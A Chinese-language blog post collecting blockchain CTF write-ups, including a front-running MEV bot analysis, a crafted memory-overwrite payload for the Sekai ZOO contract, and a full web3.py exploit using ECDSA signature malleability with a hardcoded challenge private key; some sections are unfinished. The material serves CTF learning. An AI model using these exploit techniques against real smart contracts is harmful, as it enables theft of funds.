<h2 id="0-1-staking"><a href="#0-1-staking" class="headerlink" title="[0-1] staking"></a>[0-1] staking</h2><h1 id="1-2024-WMCTF-Claim-Guard"><a href="#1-2024-WMCTF-Claim-Guard" class="headerlink" title="[1] 2024 WMCTF Claim-Guard"></a>[1] 2024 WMCTF Claim-Guard</h1><h2 id="1-0-概述"><a href="#1-0-概述" class="headerlink" title="[1-0] 概述"></a>[1-0] 概述</h2><p>这道题的合约很简单，我们只需要 register 后爆破出合适的 pow 就可以成功 proveWork，然后 claimLastWinner 即可。但是问题在于起服务的时候同时起了一个基于 <a target="_blank" rel="noopener" href="https://github.com/tonyke-bot/burberry">burberry</a> 的 MEV bot，这个 bot 会在我们发起交易时，用更高的 gasPrice 抢先在我们之前执行交易，这样我们就无法通过 <code>require(solveStatus[msg.sender].nonce == type(uint256).max, &quot;already proved&quot;);</code> 或者是 <code>require(status.nonce == 0, &quot;not first solver&quot;);</code> 这两条检测了。</p>
<p>因此这道题最重要的点就是如何绕过 MEV Bot</p>
<h2 id="1-1-分析"><a href="#1-1-分析" class="headerlink" title="[1-1] 分析"></a>[1-1] 分析</h2><blockquote>
<p>合约部分比较简单，我就不分析了，直接从 rust 写的 bot 开始分析</p>
</blockquote>
<h3 id="1-1-0-main-rs"><a href="#1-1-0-main-rs" class="headerlink" title="[1-1-0] main.rs"></a>[1-1-0] main.rs</h3><p>main函数首先监听了 claim-guard 和 burberry 的日志；然后 parse args，并创建 ws_provider 和 engine；之后通过 <code>add_collector</code> 来监听 newblock 和 pendingTx 这两个事件；再之后收集一些 tx 必要的信息比如 chain_id, signer；最后实例化 executor 和 strategy，并启动 burberry 的 engine.</p>
<p>值得注意的是，main 函数是基于 tokio 实现的，而 tokio 是事件驱动的，这解释了后面 process_event 为什么没有被调用，但仍能被触发。</p>
<h3 id="1-1-1-executor-rs"><a href="#1-1-1-executor-rs" class="headerlink" title="[1-1-1] executor.rs"></a>[1-1-1] executor.rs</h3><p>executor 比较简单，没什么值得注意的地方</p>
<h3 id="1-1-2-strategy-rs"><a href="#1-1-2-strategy-rs" class="headerlink" title="[1-1-2] strategy.rs"></a>[1-1-2] strategy.rs</h3><p>主要注意 <code>process_event</code> 函数，它调用的 process_new_block 和 process_pending_tx 是关键函数。首先看 process_new_block。</p>
<p>process_new_block 函数主要负责 registerBlock，每当新区块被挖掘出来就调用 registerBlock。</p>
<p>process_pending_tx 中，每当接收到新交易就模拟这笔交易执行的环境，在evm中执行并获取执行日志，如果日志中发现了 workProved 的函数签名，bot 就会验证参数 pow 的正确性，如果它发现这是正确的，就会用更高的价格在我们之前注册这笔交易。具体细节可以看下面这段代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 0x27d4563e</span><br><span class="line">let sig: [u8; 4] = [0x27, 0xd4, 0x56, 0x3e];</span><br><span class="line">// concat sig and pow</span><br><span class="line">let mut data = Vec::with_capacity(4 + 32);</span><br><span class="line">data.extend_from_slice(&amp;sig);</span><br><span class="line">data.extend_from_slice(pow.as_slice());</span><br><span class="line">let bytes = Bytes::from(data);</span><br><span class="line"></span><br><span class="line">let bn = finalized_block.header.number.unwrap();</span><br><span class="line">let nonce = *self.nonce_map.get(&amp;bn).unwrap();</span><br><span class="line"></span><br><span class="line">let effective_gas_price = tx.gas_price.or(tx.max_fee_per_gas).unwrap_or_default();</span><br><span class="line">let chain_id = self.provider.get_chain_id().await.unwrap();</span><br><span class="line">let tx_receipt = TransactionRequest &#123;</span><br><span class="line">    from: Some(self.sender_addr),</span><br><span class="line">    to: Some(TxKind::Call(self.chall_addr)),</span><br><span class="line">    gas_price: Some(effective_gas_price * 2),</span><br><span class="line">    gas: Some(100_0000),</span><br><span class="line">    input: TransactionInput::new(bytes),</span><br><span class="line">    chain_id: Some(chain_id),</span><br><span class="line">    nonce: Some(nonce),</span><br><span class="line"></span><br><span class="line">    ..Default::default()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以观察到 <code>tx_receipt</code> 中 <code>gas_price</code> 被设置成了 effective_gas_price * 2，而 effective_gas_price 是我们发起的 tx 的 gas_price 或 max_fee_per_gas。这样会导致什么问题呢？由于 bot 是用 anvil 模拟的，而 anvil 会</p>
<h2 id="1-2-解题"><a href="#1-2-解题" class="headerlink" title="[1-2] 解题"></a>[1-2] 解题</h2><h3 id="1-2-0-爆破-keccak256"><a href="#1-2-0-爆破-keccak256" class="headerlink" title="[1-2-0] 爆破 keccak256"></a>[1-2-0] 爆破 keccak256</h3><p>爆破出前两字节为 0000 的 keccak256 比较简单，以下是爆破脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> keccak</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        keccak_hash = keccak.new(digest_bits=<span class="number">256</span>)</span><br><span class="line">        <span class="built_in">pow</span> = i.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        packed = <span class="built_in">pow</span> + <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;00&#x27;</span>*<span class="number">31</span> + <span class="string">&#x27;02&#x27;</span>)</span><br><span class="line">        keccak_hash.update(packed)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(keccak_hash.hexdigest(), <span class="number">16</span>) &lt; <span class="number">2</span>**<span class="number">240</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found valid PoW:&#x27;</span>, <span class="built_in">pow</span>.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hash:&#x27;</span>, keccak_hash.hexdigest())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pow</span>()</span><br></pre></td></tr></table></figure>
<h3 id="1-2-1"><a href="#1-2-1" class="headerlink" title="[1-2-1]"></a>[1-2-1]</h3><h1 id="2-2024-Sekai"><a href="#2-2024-Sekai" class="headerlink" title="[2] 2024 Sekai"></a>[2] 2024 Sekai</h1><h2 id="2-0-Play-to-Earn"><a href="#2-0-Play-to-Earn" class="headerlink" title="[2-0] Play to Earn"></a>[2-0] Play to Earn</h2><p>这道题实现的 ArcadeMachine 即游戏机可以向 0 地址转账，我一开始觉得这是烧币没啥用…后来发现 permit 里的 ecrecovor 出错时会返回 0 而不是直接回滚，所以可以让 allowance[0][my_address] 为 13.37，然后烧币+转账就可以了</p>
<p>另外有时间的时候可以看看这篇<a target="_blank" rel="noopener" href="https://blog.blockmagnates.com/sekai-ctf-2024-deep-dive-into-the-play-to-earn-blockchain-challenge-a8156be9d44e">medium</a></p>
<h2 id="2-1-イベント！"><a href="#2-1-イベント！" class="headerlink" title="[2-1] イベント！"></a>[2-1] イベント！</h2><p>这道题怎么还用 rust 搞了个服务器…有点复杂，改天再看</p>
<h2 id="2-2-ZOO"><a href="#2-2-ZOO" class="headerlink" title="[2-2] ZOO"></a>[2-2] ZOO</h2><p>这道题怎么还要手撕字节码…有点复杂，今天看了吧…</p>
<p>逻辑很简单，ZOO 里的 fallback 函数接收 calldata 设置 local_animals，然后调用 commit 把 memory 里的 animals 推到 storage 里。问题出在下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint256 public isSolved;</span><br><span class="line">AnimalWrapper[] public animals;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mstore(0x00, animals.slot)</span><br><span class="line">let slot_hash := keccak256(0x00, 0x20)</span><br><span class="line">let animal_addr := sload(add(slot_hash, mul(2, idx)))</span><br><span class="line">let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))</span><br></pre></td></tr></table></figure>
<p>由于 isSolved 就在 animals 的上面，所以我们可以让 animal_addr 指向 isSolved - 1，animal_counter 就指向了 isSolved，而且对于内联汇编的溢出，GPT是这样说的：</p>
<blockquote>
<p>在Solidity 0.8.0 及更高版本中，整型运算默认启用了溢出和下溢检查。这意味着，在高层次的Solidity代码中，诸如 +、- 等运算符在出现溢出或下溢时会自动抛出异常（revert）。然而，这个默认的安全机制并不自动适用于内联汇编（Yul）代码。</p>
</blockquote>
<p>所以我们可以大胆构造了：</p>
<p>构造…构造不出来…因为有 whenNotPaused 这个修饰符不让你进这个 commit 函数，并且 idx 不能大于 7…</p>
<p>但跟 Nightu 师傅交流之后我得知 forge 可以动调合约，所以准备跑起来看看。另外，fallback 函数中还有这一段可以控制 idx=7 的 local_animals 指针：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let copy_size := sub(0x100, mul(0x20, idx))</span><br><span class="line">mcopy(offset, add(offset, 0x20), copy_size)</span><br></pre></td></tr></table></figure>
<p>既然我们可以控制指针，就可以在 0x21 修改时对任意内存写了，我们来布置一下任意memory写的payload：</p>
<p>首先，10 00 0000 xxxx(2byte的animal_index) + 30 07，这样就可以把 idx = 7 的 offset 改成我们任意想要的 2byte</p>
<p>其次，20 07 21 xxxx(2byte的name_length) + payload(长为 name_length)，这样就可以把长度为 payload 的 name_length 复制到上面 animal_index 指向的内存位置了，但这种方式覆盖之后，如果op不是10,20,30，立刻就会break，并且就算不break，由于temp已经被写完，我们也无法再修改了。</p>
<p>既然我们解决了如何写，我们要解决一下要写什么。主要问题有两个：①绕过 whenNotPaused，这个可以通过修改 functions 这一函数指针，直接跳到 whennotPaused 之后。②在 commit 最后一个 sstore 时把 isSolved 改成 1.</p>
<p>我们先来动调看看第一个问题：要解决这个问题，首先我们要知道函数指针存在 memory 的哪里，之后我们得确定修改成什么才能绕过。</p>
<p>存在 memory 的什么地方这个很简单，我们只要看跳转都 commit 时 JUMPDEST 之前的 JUMP 语句栈上第一个变量是什么就行了，我们可以看到是 0x31b，而0x31b存在 memory 的 0xa0 那一行，所以我们要改掉 0xa0 这一行，不过我们先不改，继续看需要改成什么才能绕过。</p>
<p>我们继续单步走下去，看到走到 Address 为 322 时就要跳到 431 去 revert 了，所以我们只需要改成 323，就能绕过这条 jump。综上，我们知道要将 0xa0 这一行的 0x31b 改为 0x323.</p>
<p>所以我们构造的 payload 是：10 00 0000 007e 30 07 20 07 21 0002 0323，动调起来发现已经可以绕过 whenNotPaused 了。</p>
<p>之后，我们再来解决第二个问题：如何写进 isSolved. </p>
<p>commit 里的 sstore 就只有最后那一个，所以我们要想办法在这里做手脚。但由于我们之前布置的 payload 已经 break 了，所以我们希望修改一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10 00 0000 01db</span><br><span class="line">10 00 0000 0000 &lt;- 由于我们需要控制 length 为1，所以要多布置一个块</span><br><span class="line">30 07</span><br><span class="line">20 07 21 0025</span><br><span class="line">20 07 22 0323</span><br><span class="line">00000000000000000000000000000000 00000000000000000000000000000080 </span><br></pre></td></tr></table></figure>
<p>现在我们已经可以顺利进入 commit 的 for(i&lt;length) 循环了，我们接下来的任务是看“什么操控了最后sstore的参数”</p>
<p>我们注意到 40 57 87 fa 12 a8 23 e0 f2 b7 63 1c c4 1b 3b a8 82 8b 33 21 ca 81 11 11 fa 75 cd 3a a3 bb 5a ce 是 slot_hash，而又有下面的代码可知</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let slot_hash := keccak256(0x00, 0x20)</span><br><span class="line">let animal_addr := sload(add(slot_hash, mul(2, idx)))</span><br><span class="line">let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))</span><br></pre></td></tr></table></figure>
<p>slot_hash + 2*idx 是 animal_addr，slot_hash + 2*idx + 1 是 animal_counter，那我们合理怀疑 slot[2] 里存的就是这个 slot_hash，动态数组通过访问这个hash值+offset来访问成员。又因为 slot[1] 是 isSolved 变量，所以在 sstore 的参数<code>add(add(slot_hash, mul(2, idx)), 1),</code>中，我们需要计算出 idx，使这个参数等于1，最后可以算出来是0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299,因此最后的payload为<code>1000000001fb10010000133730072007210045200722032300000000000000000000000000000000000000000000000000000000000000805fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299</code></p>
<p>另外，通过这道题我发现了其他几个之前没注意的点:</p>
<ol>
<li><p>在函数被调用之前，EVM会先给这个函数初始化一些环境，还有检查一些内容</p>
</li>
<li><p>编译器对 solidity 做的优化还挺多的，比如 switch 里的判断</p>
</li>
<li><p>太夸张了，看N1的wp，我最多就能想到用一个指针去任意地址写，N1的payload用 21 覆盖了原有的指针后，再用覆盖的指针去修改了其他位置</p>
</li>
<li><p>如果无法方便地利用任意地址读写控制一片内存区域，不妨想想这片内存区域本身的定义是什么，我们是否可以通过原本的定义让他存下某个值（比如本题的 length 就是 animals_counter）</p>
</li>
</ol>
<h1 id="3-2024-DASCTF-金秋十月赛"><a href="#3-2024-DASCTF-金秋十月赛" class="headerlink" title="[3] 2024 DASCTF 金秋十月赛"></a>[3] 2024 DASCTF 金秋十月赛</h1><h2 id="3-1-Open-sesame"><a href="#3-1-Open-sesame" class="headerlink" title="[3-1] Open sesame"></a>[3-1] Open sesame</h2><h1 id="4-2025-SUCTF"><a href="#4-2025-SUCTF" class="headerlink" title="[4] 2025 SUCTF"></a>[4] 2025 SUCTF</h1><h2 id="4-1-Onchain-Machine"><a href="#4-1-Onchain-Machine" class="headerlink" title="[4-1] Onchain Machine"></a>[4-1] Onchain Machine</h2><p>攻击核心在于不同的(v,r,s)可以通过ecrecover恢复出相同的地址。所以首先调用signin把自己注册为magician，然后调用openbox时换用另一套签名的v和s，就能使signer相同但hash不同的，从而绕过对hash的检测。exp如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> web3.exceptions <span class="keyword">import</span> ContractLogicError</span><br><span class="line"></span><br><span class="line">rpc_url = <span class="string">&quot;http://1.95.156.61:10002&quot;</span></span><br><span class="line">contract_address = <span class="string">&quot;0x0aFDC4FEE2EDd6f0E745dadBF840208114aeb943&quot;</span></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&#x27;7fe6e1cb9528b5c92eb761beddf528611092383156f7a2dee74f2896ee2182b0&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line">account = w3.eth.account.from_key(private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;account address:&#x27;</span>, account.address)</span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target.abi&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> abi_file:</span><br><span class="line">    abi = json.load(abi_file)</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address=Web3.to_checksum_address(contract_address), abi=abi)  <span class="comment"># 替换为实际 ABI</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_message</span>(<span class="params">private_key, message_hash</span>):</span><br><span class="line">    <span class="keyword">return</span> w3.eth.account._sign_hash(message_hash, private_key=private_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_uint8</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> value &amp; <span class="number">0xff</span>  <span class="comment"># 取低8位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes32</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> value.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magician_address = account.address</span><br><span class="line">msgHash = contract.functions.getMessageHash(Web3.to_checksum_address(magician_address)).call()</span><br><span class="line">signature = sign_message(private_key, msgHash)</span><br><span class="line"></span><br><span class="line">v, r, s = signature.v, signature.r, signature.s</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line">s2 = n - s</span><br><span class="line">r2 = r</span><br><span class="line">v2 = <span class="number">27</span> <span class="keyword">if</span> v == <span class="number">28</span> <span class="keyword">else</span> <span class="number">28</span></span><br><span class="line"></span><br><span class="line">param1 = (int_to_uint8(v), int_to_bytes32(r), int_to_bytes32(s))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    txn = contract.functions.signIn(param1).build_transaction(&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: magician_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.get_transaction_count(magician_address),</span><br><span class="line">        <span class="string">&quot;gas&quot;</span>: <span class="number">300000</span>,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.to_wei(<span class="string">&quot;10&quot;</span>, <span class="string">&quot;gwei&quot;</span>),</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)</span><br><span class="line">    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;SignIn Transaction Hash: <span class="subst">&#123;tx_hash.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Transaction succeeded:&quot;</span>, receipt)</span><br><span class="line"><span class="keyword">except</span> ContractLogicError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Contract error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Other error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">param2 = (int_to_uint8(v2), int_to_bytes32(r2), int_to_bytes32(s2))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    txn = contract.functions.openBox(param2).build_transaction(&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: magician_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.get_transaction_count(magician_address),</span><br><span class="line">        <span class="string">&quot;gas&quot;</span>: <span class="number">300000</span>,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price * <span class="number">2</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn2 = w3.eth.account.sign_transaction(txn, private_key=private_key)</span><br><span class="line">    tx_hash2 = w3.eth.send_raw_transaction(signed_txn2.raw_transaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;OpenBox Transaction Hash: <span class="subst">&#123;tx_hash2.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_hash2, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Transaction succeeded:&quot;</span>, receipt)</span><br><span class="line"><span class="keyword">except</span> ContractLogicError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Contract error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Other error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.isSolved().call())</span><br></pre></td></tr></table></figure>
<p>小gadgets</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看余额</span></span><br><span class="line"><span class="comment"># balance_wei = w3.eth.get_balance(Web3.to_checksum_address(account.address))</span></span><br><span class="line"><span class="comment"># print(balance_wei)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看ecrecover的恢复地址</span></span><br><span class="line"><span class="comment"># recovered_address = w3.eth.account._recover_hash(msgHash, vrs=(v, r, s))</span></span><br><span class="line"><span class="comment"># print(f&quot;Recovered Address: &#123;recovered_address&#125;&quot;)</span></span><br><span class="line"><span class="comment"># recovered_address = w3.eth.account._recover_hash(msgHash, vrs=(v2, r2, s2))</span></span><br><span class="line"><span class="comment"># print(f&quot;Recovered Address: &#123;recovered_address&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看调用内容</span></span><br><span class="line"><span class="comment"># input_data = &#x27;0x56f80694000000000000000000000000000000000000000000000000000000000000001cf7eaa8db6ab3ac102c9f9be2173e7a944d954ae247b03b2ef7925df6dd1f1d001d1126fc8b0ba6034798d39db0a7ab2568c4b0ca810ce8494bf203c718991a48&#x27;</span></span><br><span class="line"><span class="comment"># decoded = contract.decode_function_input(input_data)</span></span><br><span class="line"><span class="comment"># print(decoded)</span></span><br><span class="line"><span class="comment"># input_data = &#x27;0x64327ff0000000000000000000000000000000000000000000000000000000000000001bf7eaa8db6ab3ac102c9f9be2173e7a944d954ae247b03b2ef7925df6dd1f1d00e2eed90374f459fcb8672c624f5854d951ea2c1c2e3bb7f273e05ac5b79d26f9&#x27;</span></span><br><span class="line"><span class="comment"># decoded = contract.decode_function_input(input_data)</span></span><br><span class="line"><span class="comment"># print(decoded)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟测试，并非真实交易，require不会在真实交易里产生日志</span></span><br><span class="line"><span class="comment"># 所以用模拟交易来查看require返回内容</span></span><br><span class="line"><span class="comment"># 1. 调用 signIn</span></span><br><span class="line">param1 = (int_to_uint8(v), int_to_bytes32(r), int_to_bytes32(s))</span><br><span class="line"><span class="comment"># 2. 调用 openBox</span></span><br><span class="line">param2 = (int_to_uint8(v2), int_to_bytes32(r2), int_to_bytes32(s2))</span><br><span class="line"><span class="comment"># SignIn测试</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    contract.functions.signIn(param1).call(&#123;<span class="string">&#x27;from&#x27;</span>: magician_address&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Call succeeded!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Call failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># openBox测试</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    contract.functions.openBox(param2).call(&#123;<span class="string">&#x27;from&#x27;</span>: magician_address&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Call succeeded!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Call failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.isSolved().call())</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://heygap.github.io/en">HeyGap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://heygap.github.io/en/posts/34999.html">http://heygap.github.io/en/posts/34999.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/en/tags/WriteUp/">WriteUp</a></div><div class="post-share"><div class="social-share" data-image="/en/img/cover3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/en/posts/61276.html" title="CSBasics - NJU_Program_Analysis_Note"><img class="cover" src="/en/img/cover6.jpg" onerror="onerror=null;src='/en/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">CSBasics - NJU_Program_Analysis_Note</div></div><div class="info-2"><div class="info-item-1"> 记录一下上课+做实验时产生的问题、思考与收获    [1] Lecture1 Introduction[1-1] what is Static Analysis？Static Analysis is different with dynamic analysis, analyzers need to construct static bird’s view of the whole workflows. Besides, static analyzers usually focus on the consequence of the analysis rather than the process. [1-2] What is a good Static Analysis?Before introducing what is a good static analysis, we need to find out what is ‘sound’ and what is ‘complete’. sound: We describe a result is sound when...</div></div></div></a><a class="pagination-related" href="/en/posts/27164.html" title="Web - DNS Poisoning"><img class="cover" src="/en/img/cover9.jpg" onerror="onerror=null;src='/en/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Web - DNS 